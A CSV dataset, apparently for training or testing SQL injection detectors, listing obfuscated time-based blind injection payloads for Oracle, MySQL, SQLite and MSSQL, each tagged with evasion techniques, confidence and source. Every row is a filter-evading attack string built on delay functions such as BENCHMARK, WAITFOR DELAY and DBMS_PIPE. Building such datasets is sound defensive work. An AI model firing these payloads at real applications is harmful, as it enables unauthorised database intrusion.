payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1'+ ( sElEcT 'asmj' WHErE 0X0X6B0o0x4336 LiKe 0X1eda Or (SeLEct 7xA0b110051) = DBMs_pIpE.RecEiVE_MESSAGe (( Chr ( (sElEcT (seLect (sELECt;(sELecT (SELECT (SELECT (SELECT 112))))))) ) oR CHR+ ( (SeLECT 0x41) ) Or! Chr ( }(SelEcT 0B1010001).!) || chr (/*i(z8k,ZFKc*/ 0b6x57` ) ,(SELect (SElECt (SELEct 0x5)))?* )\ ) +'",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1' iN BOOLean/*<D/!0b10G;zZ*/mOde=.); :or 0b0x0x846) LikE beNchMArk ( 0x2C4B46,MD5 (' 0o0x0X0B0O0B0b1001010100101101010110101001111011a1O51311+@ ) ^) : or FALSe anD 4X0O1||fALSE and (seLecT (SELECT 8149)) <> 0o17726#+0b110X#aM`",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0o10' ) or (SeLEcT (selECT (SeleCT (sELecT (sElECT 0x980))))) lIKE LIke ( 'aBcDEfg',uPpEr ( HEx ( @RaNdOmBLob ( 5X0O0b115dcd6500/(SElECt/*`<\]*/(seLect (SELECT 2))) ) ) ) )",time_blind,sqlite,case_variation|comment_whitespace|inline_comment,0.53,rule,sqliv5_json,unknown
"0b0b0B0O0X6 whERe 0x0x9a3 lIKe (SeleCt>0X0o10dB) aNd (sElecT 0X9e9) lIKE dbMS_PIpe.ReCEIvE_MessAGe ( Chr;^(_%(SEleCt 0O2o114) )! ||CHR ( 0b0X0o4172112$ ) Or chr@?( 0X75 ) &||ChR .( (Select (SeLEct 0X43)) ) ,0o0x0o0O0O5 ,) OR \(SELECT (SelecT (SELeCT (seLecT 0x0)))) anD tRUE&or FALSE and (SelEcT (sElecT (SELEcT (seLect (SELECT 1))))) And (seleCT 0b101111010101)=0XBD5 && 0x1 oR faLsE OR False AND 1 --",time_blind,oracle,case_variation|scientific_notation,0.46,rule,sqliv5_json,unknown
"0B4B6"" ) |[ || (SeLEcT 0X0o0x15BF) lIke like)%( 'abcdEfG',uPpER ( HEX (@ ranDomBLoB ( (SElEcT (sELECt/*f""*/(SeLEct 0X3dceeeC0)))/(seleCT (sElEct (SelECT (SeLeCt (SELECT (SELECT (SELECT 2))))))) ) ) ^* ) Or 'k' NOt lIke 'k' AnD^ truE# ) aNd (? ""zBwN"" Like ""ZbWNn p|",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"1"" ) or 0b10000000010010 =/**/ bEnchMaRK ( 0x4c4b40,mD5@ ( 0x194A0O0o0b0b10010010111111011001001000100000111110110011 ) ) and ( ""ubvD"" likE ""UbVd",time_blind,mysql,comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"seLect dBMS_PIPE.rEcEiVE_messAGE ( ChR ( 4x42 ) OR Chr ( 0x0b0o327025/*N*/ ) Or chR ( (seLECt (SelECt (SeleCt (SELeCT (SELecT (sElecT (selecT 0X4F))))))) ) or, $CHR -( (SeLECt 0x329)/**/') ,(sElEcT 0X5) ) fROM DuAl aNd ( > .( 0x1C48 =[ 0o0X0O0o1C48",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"0x1' ) ) ) ANd (SELecT (sELECt (SelECt (SeLECT (SeleCt 4Xc87))))) like LiKe ( 'ABcdefg',upPer !( HEx ( raNdOmBloB ( (SeLect 0X0o1Dcd6256)/2X0b0b0b0xA ) ) </*Iog<|](SELECT (SELECT (SELECT 3)))@i1e!TX_v*/) ` ) ? && | * (. ( ;( 'IsYg'> LIkE 'isYg",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,unknown
"1' OR > *0x0o0O4340 lIKe bENcHmark (\ (seLeCT 0x4c4B40),Md0x5 ~( 0b101X0B0b111100001101010000111010011110A0b1007010901001 )_> {)+/**/",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,string_single_quote
"0b1' ) oR 0B0110101100112~ =: dbMS_pIpE.RECeiVE_MESsaGE ( Chr ( (selECt (seleCT (SELEct (SeleCT (SELECT 0xec)))))> ) ` Or cHr *(: (SeleCt 0x43) ) ) OR Chr! ( 0x5a ) +or chr (; (SELEct (selecT 0X6d)) )^',(seLECT (SElECT 0x5)) ) && 0O0b10109011051101!=0x0x3O0B10001101101@OR 'VD0o0O4' <> 'VD4'/or ""!"" NOt< LIKe ""!"" oR fAlse$aND (SeLEct (SeLeCT (SELECT (SELECT 1)))) and TrUE --",time_blind,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"SeleCT BENCHmArK ( ~(SElEct (SeLecT 0b11X5C4b41)),md0b101- ( 0o9X8C4d6137 +) ` ) ; aND * ( +(* / ( `'EGnv' LikE)'eGnv",time_blind,mysql,case_variation,0.45,rule,sqliv5_json,unknown
"0X1' OR < :>(. SELEct 'LtqO';Where 9X2362 liKe 0x3x1X34a$aND (SElEct 0xdAe) ;=].LikE (, 'abcDEFg',uPPer; (: heX.&( rAnDoMbLoB ( 0X302fBf31/(SElect (SELeCt 0b0O0X0b80)) ) [ ) ?; ) < )] () OR: '",time_blind,sqlite,case_variation,0.53,rule,sqliv5_json,string_single_quote
"5%''`) and _2xc4B0b0b1101000111010011010010110011111000010100001010000000101011000110|=` lIkE (^]'ABcDEFG',upPer/*(sElEcT (SELect`(sELEct 0X0O0o6)))$Z0O0B0B1011@]0O81I2q~/(!gvr-tNy""y0b101Et q :sQWjU<""`(SELECT (SElEcT (selEct-0B0)))*/}(; heX (/**/ rAnDoMbLoB ( 0O0x0b3DcD0x0B11110101104/0B0B0O3b10 + )* }) )) )^ ANd ( '%' ""like '",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
WAitFoR DElaY '0O0O6:(sELect 0x6):0x0B0B111111110o0b0o0b675' AND ( +([ }( :(seleCt 0B0x6315) = 2951,time_blind,mssql,case_variation|hex_string,0.46,rule,sqliv5_json,string_single_quote
"1' OR, AnD 0x0o147e=(sELeCt 0x0O140e) oR FaLSE+ANd (SElECT 0x4) AND tRuE aND{TRUE Or ""m""_nOT LiKe ""m"" && (selEcT (sElECT (SelECT (SELECT 1)))) OR (sELect (selEct (SELECT 0))) AND TruE And tRuE or 0 Or FALSE#3X14a8 LiKE likE ( 'abCdefg',UppER ( hEX ( rANDomBLob (< 0x1dCD8500/(seLecT 0B101X6) ) ) } ) ) && 'AYtf' like 'aYTfv ?j<\Y",time_blind,sqlite,case_variation|function_alternative|hex_string,0.53,rule,sqliv5_json,string_single_quote
"1 ) )< or 0B0b10010001100001010100011010001010100000011010 =* bEnCHMaRK (/*|;sHf?fj*/ 0b10051009100101101080000,mD5 (< 0x0o0O0b10011101110a0O0B10101111001011 ) [ ) aND ( ( (sELect (SelEct 0x1FFD)) LIKE 8189",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1' And 1O0b0B0B0o0b1001100000111110100101010101111011110010100110011111111001110101110101111001010000100110000011100011001011001100101111100000111110010=lIkE; ( 'abcDefg',UPPER (~/*TzF*/Hex ( rAnDOmblob ( (seLEct (selECt (SeLEcT 0x17d7a3a4)))/(SeLect 2) ) /*y || 7=*/ ) < ) ) and 'mNOd' liKE 'mnod",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"SEleCt lIkE ( 'AbcDEfg',uPPeR ( hEX ( randOmbLoB ( (SeLECT 0O0x0b0b10001010111110101101000010111001000101001000101001100100010101011100100001011101011110100111111100011000)/(SeleCT 0b0X2) ) "") ) ) @ && ( ( ""NxVP""/**/ lIKe ""NXvP",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"5B8b0O0x1 whERE 0X1C4e [likE (SelECt (SElECt 0o0o5O1o7x1C7b803D)) oR+(seleCT 0x87bf) =<liKE <(! 'ABCDEfG',uPper ({ hex ( rANDOMBLOb ( 0x1DCE0140/(sEleCt`(sELeCt (seLeCT 0x2))) ;) ) /**/ ) ) AND 5x0 Or (sELeCT (SELECT (SELECT 0))) OR fALSE OR False#or! 'jj'='jjV'\oR 1041001101118 NoT LIKe (SeLEcT (sElEcT 0x0b1111100e)) Or faLSe or ""?"" Not LIKE ""?"">--`8",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.47,rule,sqliv5_json,unknown
"3 ) ; .) AND 0O0o5x2578 Like dBMs_PIpe.reCeivE_MEssage ( CHr (: 0O4O0O0X45 ) liKE,Or cHR ( (SelECT (sELecT (SELeCt 0x0o4F)))/ ) Or CHR ( 0O5O153 ) OR~ CHr ( OR (SEleCt (sELeCT (SElEct (SELECT 0))))# (SEleCT 0X15) ) ,0O2X0O4 ) OR FAlSe AND True oR 0x0Xa93=(SeLECt)(SelEct (SELEcT`5X9C0))) Or 'Z' LIkE 'z/' And 'ZBv' Like 'zbv' oR FAlsE or FAlsE Or FAlSe ANd tRue?oR FAlsE --ZD3",time_blind,oracle,case_variation|function_alternative,0.41,rule,sqliv5_json,unknown
"selECT likE $( 'AbCdefg',uPPeR/**/ ( Hex (> RANDoMblOB ( 0b0b1000111101111010011111011110111000110000000000110011000001110001111111101110111010010100000000/2 ) ) ) ) ANd > ( ( ( ""ksiP"" LIKe ""ksiP",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,unknown
"seLect dbmS_PIpe.rEcEiVe_mESsagE ( ChR% ( 2x0o0X2A ^) Or cHR ( ""63: ) oR ;Chr ( (SElect (sELEct 0x0o4f))) ) % OR chR :( (sELect (SElecT 0x1fc)) ) %,0O4x0B0O5 ) froM DUAL-- VykX3^-ueFn[I=4",time_blind,oracle,case_variation,0.51,rule,sqliv5_json,unknown
"1 ) And 6x197f lIkE dBms_pIPe.reCeiVe_mEsSAge ( Chr >( 0X4c ) Or?CHr ?( (SeLecT (seLeCT (SElECT (selEcT (SELECT (SELECT 0x16e)))))) ?) oR cHR @( (SEleCT (sElect (SeleCt 0X75))) ) ( or chR ( 0X0x29 ) ,0X5 ) ANd (/*paY"";e*Gd*/ 0X195f=4950",time_blind,oracle,case_variation|inline_comment,0.46,rule,sqliv5_json,unknown
"1""/**/ ) ) /**/anD 0x0b6b0X0b11000111d0B0B0b10101011001000011001010000010010100101011000010101010011101011111010001011011fEc LiKe like ;( ;'aBCDefG',uPpEr }( ;hex ;(, raNDOMbloB ( 0O5X0DcD0o0B0B1100103102109/0X0b0b1X0O2 ) )/**/ + )}& ) < && ( -( * ""qUni"" LIkE ""qUNI",time_blind,sqlite,comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"2b0o3' ) ) ' ) =or{(SELecT (seLect 0x1B3E))&LIKE likE ( .'aBCdefg',uppER! ( }HEx/*0o11y$E2=&[w/li.B:aQ6r*/ ( rAnDOmblOB ( (seLECT (sELEct (SEleCT (Select 0X0xe9eacd8))))/0O6b0b0O0X3F4 ) ) {) ) or 'M'!='M' AnD/**/0B9O0O357213017673113 NOT LIKE (sELEcT_2x0O0X0B0X0b0O2450) && (selEcT (sElect (SeleCT (SElEct:(seLEcT (SELECT 1)))))) Or 0b0X178f0o213023!=(sElECT 0x9BF) Or (selECt (SELECT (SELECT (SELECT 0)))) && True --U",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|hex_string,0.53,rule,sqliv5_json,unknown
"1', ( seleCt ( CaSE when (]:8609 LiKE 0x649 ) thEn WAITFoR deLay '0:(seLECt (SeLeCt (SelECt (SELECT 8)))):5' eLSe (sELect 1609)* ( sELecT 4x649'From maSTer..SysDAtaBaSes ) End ) )",time_blind,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"1%"" =). )% >{or,0x37B=dbMs_pIpE.ReceIVe_MeSSaGe (;/Chr ( ?(sELECt$(SELEcT (SeLeCT (SElECT (SelEct 146))))) ;) /**/ or chr$_( -0X0b0b1B :) ||chr ( (selEct 2x0o0X5A) ). or CHR (\ (sELecT 0X9){ ) ,0o9) ) or <0x1963=4O0o34320 AnD ""3021 NoT LIkE 0x0o0b0X8o0B101011810100 aND ?(Select 3X5b)!lIKE 0X0B: && 0b1 OR](seLeCT (seLECt (sELECT (seLecT 0)))) Or \""w"" Not likE ""W""* aNd ""q^5S"":nOT+LIKe ""Q^0b101S\"" ANd ""8j+"" not lIKE ""8J+C"" Or FaLSE or+faLse; AnD TruE or fAlse||FAlsE OR faLSE aNd tRUe oR ""e`8""=""e`(SeLECt 8)\"" AND 'U' not lIKE''u\' OR fALSe Or falsE OR False#ANd trUE --R""",time_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_single_quote
"1' ) )= and 0xef0O0X0=beNcHMArk (( (seLEct (sELecT (SELECt 0x7c0O0X4B43))),mD7b107_ (? 0x0B0b101001011001101000001010100101101010111101100010100000111000101110001110010110111011010 ~ )% ) And</**E8.-Ypf*/\ ( [ ( 'InRM' lIKe.'InRM",time_blind,mysql,case_variation|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1"" ) ) /**/ ) OR (SelecT 8384)=liKE ( 'ABcDefg',UPPEr ( hEx_ ( RaNdOMBlOB ( 0b0b1000111101111010100000111101110000010010000100100011001000010110010110000110111010010100000000/2 ) ) ) ) anD ( ( ( ""nEVR""/**/lIKe ""neVR",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,unknown
"6 ) Or 0O0x2212=BEnchMarK ( !(Select (sEleCT 0O93045504)),mD5 ( 0X0X2b0x1o7A7x0O2411 ) ) aNd ( (seleCt?(seleCT (sELeCt (SeleCt (SeLEct (SElect (SELECT 1743)))))))| = /**/ 1570",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0b1'& ) WHERE 0B0b1011110000100101110011011001010001111 lIKe 8775-OR 0xa49 LIKE>DbmS_PIpe.rEceIvE_mESSaGE ( ChR} ( 0x0B1000110 ) ~ Or cHR ( 0X44 [) or cHR/ (/*y?A*/ (SELECT-65) )$ OR]CHr .( 303 ) ,0x0o5 )] AND ""L`g"" nOt like ""l`gC"" aND 'c)J.'!='c)j.u'@ aNd (SElect 0x12d)\noT~lIKE 0b100101110 oR falSe!aND/*<*/(SelECT (SELECt 2124)) /**/NOT LIkE 0B1101111010101 AND/**/4861 In (0b1011011100100,0X0B0B1100fd,0b0B0B0b1101000011001001011000000010011100011110100010100100101100111000000000111000101001010101000101010100001010110101000100101110001110) . $&& 0b1100111100110 noT lIKe ]6631 anD(3239 NOT LIKE 3240 ANd tRUe%aND tRUe OR fAlSE OR False OR,False OR 8340 NOT IN (8339,8340,8341) --",time_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,in_clause
"0b0B0X0o5' oR/*;P=FFV^a\Ba??mT*/ ( :SElECt:'BviC' FrOM DuAL wHEre 1X0x5X12E0o7 LIKE +0o9x0X0o4B0x12E7 or (SeLeCT 9xa49) Not liKe+ dBMs_PiPe.reCeivE_mEsSAgE ( _Chr <(@ 6X0B6b5b1091101000101111001101011101051010001010100011011001000110010104 ) or, cHR ( +0X95 /*[I&(Ts0o2prRA7?<m]68mfBJK*/)[ Or chR>-( (sELECt (sEleCt 0X0O55)) )): % oR !ChR (/*Hg H^*/!0B0X67 ) !,(sElEcT (seLECT (selEct 1B0o0b0x5)))+ ) ) OR '",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"0X6"" ) whERe@0X1f02.?= (SElecT (SelecT (sElEcT (sElecT 8XF67))));AND 0x0X0X0x208 lIkE dBms_pIPe.ReCEive_mESsage ( Chr ( 0x85 ) . oR CHr (/*eIY*/ 0O0X0x0O5F* )/**/ Or CHR =( 0o0B10110001 )! oR cHR; ( 8O104 ]) ,0B0X5 .) AnD 0b0x0x1 ;&& TRuE||(sELeCT (seLecT (SeLECT 0X0))) oR FalSE Or fALSe AND TRUe{ && (SEleCT (SelEcT (SeLeCT (SeLECt (SElEct (SEleCT 1)))))) ANd ""DYnQZ""!=""dYNqzj"" --",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,string_double_quote
"SeleCt= ( 'aBCdEfG',uPpEr/**/ ( HEx ( RaNdoMbloB ( /*Le/*/0B0b1001001101011011000110111101000010001001011000111100101001010100101011101110111010010100000000/(selecT 0b0b1010) ) ) ) { ) ANd ( ( 0b1111001000101=0B1111001000131",time_blind,sqlite,case_variation|comment_whitespace|inline_comment,0.53,rule,sqliv5_json,unknown
"0x1 )}- WHeRe/*<;R}(sElect (Select (SelECt 4)))*/0x206e $= (sElecT (seLeCT (SElECT 0b0X0O14E))) Or;0b101101630101 like= DbMs_pIpe.reCeIVE_meSsAgE ( ChR (* (SElEct (SElecT 112)) ) || Chr/*HpG u^@)RuZvt*/ ( 7x4B- ) Or chR\,( (sElect (seleCt 65)) OR 0B0 oR fALse OR FALSe#)+ or CHR ( 0o0x0o147~ ) +,(SElEcT (SELECt (sEleCT 0x5))) ) --v$J`*",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0b1%""]\ ) )> )_ && 8173"" likE LiKE^ ( <'AbcdEFG',UPpEr+,( HEX] (`.rAndoMbloB ( :0x3DDCA670/0x0b11] ) {;) ) ) +AnD ""&O""=""&o"" or?(sELect (sELect (SElEcT (selECt 8O0X8)))) OR ""/*{Wg(?mu""ESz`*/ or (SELeCt=0O4X8) oR """"V~r""=""""V~r}"" or |6B7o9b0O0o0O0B0X4B0X1 and=!""SI.~"" NOT~likE ""si.~w""<oR:falsE' AND tRUe~anD (selECt (SELeCt 0x1)) And (SELecT 0x0b1) or*FAlse ANd TruE aNd$tRUe oR fAlse and trUe aNd TrUe And>(Select (selEct (SELECT 1))) OR faLSe Or FaLsE oR FaLsE Or fALse#9"" NoT LikE&""#8O12""`--&do2B5Oe0L5+{GUc_WG",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,string_single_quote
"5 OR@9x6o0b1000000000100 >= BenCHmARk ( ?0X0X0X0x0b0b1100100C4B0X0b5B10101101011160,mD5 ( ;0O11o0x694A0b0B1011910001001 ) * ) -or['s'^Not\likE 's' or faLSE#/**/IRVmL j8`/F",time_blind,mysql,comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,numeric
"0b90""&&0o7O4X0xEF0 liKE].BEnCHMarK (/*tIGOfd<LN;m+*/ (seLeCt 0x6AcFC0),md4X5 ""( /3X0x4404C4o5a )?/*xY)OLw2H*/ /*SVfLd*/)",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"4o1"" ) ) As VtAD whERe`(selEcT (seLect (seLEcT (SELeCT 0xE45)))) LiKe 0O7105 PrOCedure AnalYSe (^ eXTRactVaLuE/*/D`)(*/ ( (selecT (SELECT (seLECt 2627))),cOnCAt ( 0x5C, ( BeNchmArk (] 0X2c0b0b140b3a,Md6 ( 2x0x5b774C75 ) ) )> ); ) ,0o0 ) Or 9o15111(NOt iN ((SeLeCT (sElECT 0X5A7A)),0X1A71,0x1a73) AnD "" ""="" "" and tRuE/**/ anD TRUe or FAlsE oR falSE Or 0 Or (select (SElEcT (SELECT 0))) aNd tRUe#-BTBca",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,in_clause
"0b1' [)? as wnYS;WHEre (sELeCT (seleCT (seLect (selEct'(selECt (seLeCt (SeLECT (SelECt#(SeLECT (seLECt (SeLEcT 6457))))))))))) LikE""9460 OR \6X4o4136*=+BenchMArK ( (SeLect (select (SElECt (seLECt 0x4c4B90)))),md0b10 ( -0X0X544d0o5a4c,| ) :) Or '""' Not like '""'<aNd~'&' Not LiKe '&Y' or 'jP2n' <>;'jP6b12n' OR ""yG""=""Yg7"" aND/**/6x18b9 NoT lIke 0x18BA &&} 'y/, D' nOt likE 'y/, dU'/**/or falSe and + (seLECt (selECt 0X32e))<>(sElECT/(SElECT 0X37f))!Or faLSe#\(Ly2",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,string_single_quote
"SeLEct DBMs_Pipe.RecEIve_mEsSaGe ( cHR *( 8x44 ) ||cHr ( :0x43 ) Or ?chR [(? 6B0x89 ) OR cHR ( 2x62 ) ,(SelECt (seLect (sEleCt`(SeleCt 1X5)))) ); FROM DUAl and[: ( | (, 'CgOU' like 'CGou",time_blind,oracle,case_variation|function_alternative,0.51,rule,sqliv5_json,unknown
"1""|aNd_0B100101010100 LIKE;/**/ beNcHmARK ( (SELECT 5000000),Md5 ;( 0o0X0x0b110d0b1101111100111000001 +) ) $ OR 8668 NOT LIKE 8668#@c",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1'+ ( selECT;aAhC)wheRE (seLect (sEleCt (sElECt 0x0b0b0o0O0B1110151100101110101110001000011011115100)))~=*8X0x0o0O0b11101100c<anD 0O7360 $LiKE BEnchmArk (@>0x4c4B41,mD0O5[ ( 3X76535612/**/ )/ )~/**/ '=) +'",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1"" {) ) AND (sELeCt (sELECt 0X0XC5f)) LIKe$ dBms_PipE.ReceiVE_MEssAGE ( Chr (! 9x46/*)'S;U|7PH!*/ ) oR CHR ( 0x25? ) AND (SELEcT (SEleCt (selEcT (SELeCt 3294))))!=0x0xcDf#||CHr ( 2x70(]) oR cHr] ( (Select`(SElect (SElECt (sELECT 0o103)))) ) ,0x0o3X5, ){ && ( [ ( [""Qqky"" liKe ""Qqky~(SElEct (SELECT 3))^`l}O",time_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"1%'${-\OR! ;0B0x2177&%;likE)- BENChMArk(|(`|0X0x8O0O4c1b48,mD7 :(~~6X0o0X0X0x0B6a0b6X0O0o0o9B10101115110111:?+)/*((sELECt=0B8)!TX/~;WR*0x1 ]p5Z?-?p,;ALqodm*/?/[puCuTl}~Xe~b*/p[,0x0X2*/ ) >%):AND)&'%'='",time_blind,mysql,case_variation|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0B0b1000%"" ) +)+ - ) && ? 0B0x6B0b1011101101100111000111000110111001110` Like BeNChMARk (< 0x4C5b0o50,Md1* ( 0X0X0b1110100100011111010000105 ?) ) aNd, ( ( ( ""%"" 'like """,time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"0b0x1"" ) )*. as DUny whERE (SElect 0B0O0o0O34151)/**/ = (sElect&9xEaC) OR (seleCt 0B0B1810011111790): LiKE DbMs_PiPE.reCeiVE_mESsaGE ( ChR/*FAp{*/ ( 0O0xa6 ) ^OR Chr ( 0x0x07 )[ or chr| ( 0B1011710 ){ or CHR+ ( (SelEcT (seLeCt (sElEct (SElECt (seLECt (seleCt|(selEcT (SElecT (SELECT (SELECT 109)))))))))) ) ,(SeLecT 8X5) ) aNd TrUE AnD 'z!'='Z!'; or 0X0 AnD trUe oR FAlSe AND True --",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.41,rule,sqliv5_json,unknown
"1' oR ?(sElEcT (seLEcT (SeLect (sELEcT 0O7B0X0b0c4))))=lIke }( `'ABCdEfg',upPer (~`hEx{[( raNDOmBlob ( >2b11101110011010110010100000109/0x0x0B113o0B10 ) ) ;) ) AND 'ybJO' ?liKE 'ybJO",time_blind,sqlite,case_variation|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"SeLECt dBms_pipE.REceive_mEssAGe (_ CHR ( (SeLEcT (SELECT 0x0B101150))+ ) OR CHr ( 0x40 ) or CHR ( 0X0o4f ) /*\n (sElECt (SELECT (SELeCT (SeleCt (SEleCt (selECt (SeleCt 4)))))))/NQR*/ or Chr ( (seLECT (sELeCT 0x2b1000001)) )} ,0b0O253 {) from DuaL aND= ( ( >( 0X1f4A LIKE 0b1151100351010",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"2X0%""\ )> +.) ) > Or 6x1B43 ""= LIke (] 'aBCDefG',uPpER, ( ;HeX ;( raNdOmBLoB (| 0o6b6x0o1DCd61B8/3X0b0O0b0X2$ ) ) < ) ` ) Or 'F' liKE 'fA'/**/or faLSE AND (seLect (selEct (sEleCt (SEleCt (Select (sELeCT (SELECT 7))))))):aNd (SELECT (SELECT (SELECT 1))) AND 1 --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.47,rule,sqliv5_json,unknown
"4' ) ) ;""oR 0xa49 = DBmS_piPE.RECEIVe_mEsSaGe ( Chr >( 0o0o0x7b113169~ ) oR CHr ( 7o3X3d () \ OR Chr ( (SELect 0B0X5B0O0O305816) ) oR CHr /* or (SeLect (SeleCt (SelecT (SELECt'1x3F1)))) nOt lIKe 0B0x3F3O1>aNd TrUe Or fAlse@or FAlSE OR fAlsE%or faLse && True or ""N])sj""=""n])SjI"" And (seLEct (SelEct (sELect (seLEct 1))))/*oaeF*/ oR (selEct (sElect (SELEct (SELECT 0))))~Or faLSe OR False AND 1#y`0x0B1001(q`0o3hx%Emx?>sr*/( 118_ ) ,(selECt 0B6x4b731), ) And '/*3Z oR , FaLse#OX|S/~]MZi9g<z*/ (* ( \ 'yLQL' lIkE 'YlqLV,3zSBUU""ja",time_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"1 WHEre 0X0b0O0b11300111100101 = 1X0o17fb&&(SeLecT.0O0O0b11011111901010) lIKe lIKE ( 'AbcdeFG',UPpEr]\(%{HEx [( randomBLOb ((=-0o0x0X1dCD6500/(seLeCt (SELeCt (SeLEcT (sELECt (sElECT (SelEct (SeLect 2))))))) ^ ) ) ~). )? ;--",time_blind,sqlite,case_variation,0.53,rule,sqliv5_json,unknown
"0%'\ ) ) AND*(sELECt (SelECt (SElEcT 0XDD1)))[ *lIke , DbMs_PIpe.recEive_meSSage ( Chr <( 0O5x56@ )/*|(SeLECt (seLEct (select 0x0O2)))\l3+i^[nM?`%j*/ oR CHr[ ( $(sELecT (seLEct;0x9E)){ ) > oR ChR ( (SElect (sElect 0X0B8B0o4x8o2B)) ) OR:ChR ( 0X0b10101 "") ,1x5 ) / And ( ( :{'%' lIke <'",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0O5x0B107%' ) ) [`). ?or*)(SeLecT 0B0b0o0X10C1).-=/*<iQ%Tv{i*` Eg s=S:;4cjX<DuWYf []*/ lIkE!<( 'AbcDEfg',uPPeR`:(""(HEx (:{randoMBLOb ( _0o0b115X0o1DDcA110/(seLeCT;0O5O0X1O0b0O0B0o0o0o43):](). .) * {) `~?) }AnD +(`?:(( {|(=='%' : ;= < '",time_blind,sqlite,case_variation|inline_comment,0.53,rule,sqliv5_json,unknown
